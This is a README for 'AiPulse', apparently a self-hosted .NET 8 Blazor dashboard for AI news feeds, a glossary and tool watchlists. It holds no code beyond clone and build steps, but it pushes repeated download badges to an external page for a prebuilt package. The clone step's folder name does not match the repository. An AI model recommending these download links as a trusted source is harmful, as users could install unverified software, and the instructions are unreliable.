# AiPulse v2026 - self-hosted dashboard 2026

> **AiPulse is a self-hosted dashboard built with .NET 8 and ASP.NET Core Blazor for AI-oriented developers, combining RSS news, learning material, tooling, and alerts in a single up-to-date release.**

[![Platform](https://img.shields.io/badge/Platform-.NET%208%20%2F%20ASP.NET%20Core%20Blazor-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/will-bennettivzw622/aipulse-ai-dev-hub?style=flat-square)](https://github.com/will-bennettivzw622/aipulse-ai-dev-hub)

---

<p align="center">
  <a href="https://will-bennettivzw622.github.io/aipulse-ai-dev-hub/">
    <img src="https://img.shields.io/badge/Download-AiPulse%20Latest-brightgreen?style=for-the-badge" alt="Download AiPulse">
  </a>
</p>

> **[Direct Download - AiPulse v2026](https://will-bennettivzw622.github.io/aipulse-ai-dev-hub/)**

---

[Download Latest Build](https://will-bennettivzw622.github.io/aipulse-ai-dev-hub/)

---

## Overview

AiPulse gives you a dedicated, self-hosted place to keep up with AI news and resources without juggling multiple tabs and services. Its dashboard interface brings together live RSS and Atom feeds, reference material, and practical tools so everything stays in one easy-to-scan workspace.

It is aimed at developers, technical teams, and solo builders who want a customizable way to follow the rapidly changing AI landscape. With learning content, a tools matrix, watchlists, and digest support, AiPulse helps organize scattered updates into a clearer daily workflow.

---

## Capabilities

- Live aggregation of RSS and Atom news feeds
- Glossary and learning center for quick lookup
- Tools matrix with watchlist support for tracking resources
- Desktop notifications for new or relevant updates
- Multi-user roles with admin approval workflows
- OPML import and export for feed portability
- Full-text fetching and scraping for expanded article views
- Weekly digest output and trending analytics

---

## Installation

Clone the repository and run it like a standard .NET 8 ASP.NET Core Blazor application.

1. Get the source:
   git clone https://github.com/will-bennettivzw622/aipulse-ai-dev-hub.git
   cd AiPulse

2. Restore and build:
   dotnet restore
   dotnet build

3. Start the app:
   dotnet run

If you prefer a published build instead of compiling from source, download the latest package and start it according to your hosting setup.

---

## Getting Started

Once the app is running, open the dashboard in your browser and add RSS or Atom feeds to begin. After that, you can organize sources, inspect fetched content, and use the glossary and learning sections to explore terminology and background information.

Typical workflow:
- Add or import feeds with OPML
- Review the news stream and trending items
- Save useful tools into the watchlist
- Enable desktop notifications for timely updates
- Check weekly digests to catch up on changes

For multi-user deployments, set roles and review approval settings before granting access to additional users.

---

## Configuration

Most settings live in the ASP.NET Core host configuration for the application. Feed sources, notification behavior, digest options, and role-related settings are usually managed there or through the dashboard, depending on how you deploy it.

Example application settings pattern:

{
  "Feeds": [],
  "Notifications": {
    "Enabled": true
  },
  "Digests": {
    "Weekly": true
  }
}

If you change hosting or authentication behavior, update the relevant environment or app configuration values used by your deployment.

---

## Requirements

- .NET 8 runtime or SDK
- ASP.NET Core hosting support
- A modern browser for the Blazor dashboard
- Network access for RSS/Atom sources and fetched article content
- Storage for feed data, watchlists, and digest history

---

## FAQ

**Does AiPulse need an AI model to work?**  
No. It is a self-hosted dashboard for following AI-related content and resources, not an AI engine itself.

**Can I import existing subscriptions?**  
Yes. OPML import and export are available for moving feed collections into and out of the system.

**How are updates handled?**  
Use the latest build from the project distribution you maintain, then redeploy or rebuild as needed for your environment.

**Where do I adjust notifications or digests?**  
Those settings are generally configured in the app settings or inside the dashboard, depending on your deployment approach.

**What if fetched content is missing pieces?**  
Review the full-text fetching and scraping settings, and confirm whether the source site permits complete article retrieval.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
